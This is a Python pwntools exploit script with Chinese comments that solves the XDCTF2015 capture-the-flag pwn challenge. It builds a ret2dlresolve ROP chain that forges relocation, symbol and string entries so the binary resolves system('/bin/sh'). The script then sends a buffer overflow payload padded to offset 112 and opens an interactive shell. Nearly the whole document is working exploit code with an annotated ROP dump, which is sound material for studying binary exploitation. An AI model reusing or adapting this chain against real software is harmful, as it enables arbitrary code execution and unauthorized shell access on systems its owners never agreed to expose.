from mmap import mmap
from helper import *
import helper
import re

abbre(globals(), io, loader) # 此处定义了常用的缩写

dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
# pwntools will help us choose a proper addr
# https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())
ru(b"Welcome to XDCTF2015~!\n")

# 0x0000:        0x80490a4 read(0, 0x804be00) # size=0x8049030
# 0x0004:        0x8049352 <adjust @0x10> pop edi; pop ebp; ret # 吃掉 arg0 和 arg1
# 0x0008:              0x0 arg0
# 0x000c:        0x804be00 arg1, `addr of payload_2`
# 0x0010:        0x8049030 [plt_init] system(0x804be20)
# 0x0014:           0x3a98 [dlresolve index] -> 重定位表项： 0x804be18 <- <0x0804be00, 0x3be07>
                                              # 符号表项 0x804be08 (0x8048228 + 0x3be0)
                                              # 动态字符串 0x3b38 + 0x80482c8 = 0x804be00
# 0x0018:          b'gaaa' <return address>
# 0x001c:        0x804be20 arg0               # /bin/sh for system

# print([hex(u32(i)) for i in re.findall(b"....", rop.chain(), flags=0)])

rop = ROP(elf)
rop.raw(dlresolve.payload)
print("======================")
print(rop.dump())

payload = flat({112:raw_rop})
s(payload)
s(dlresolve.payload)
shell()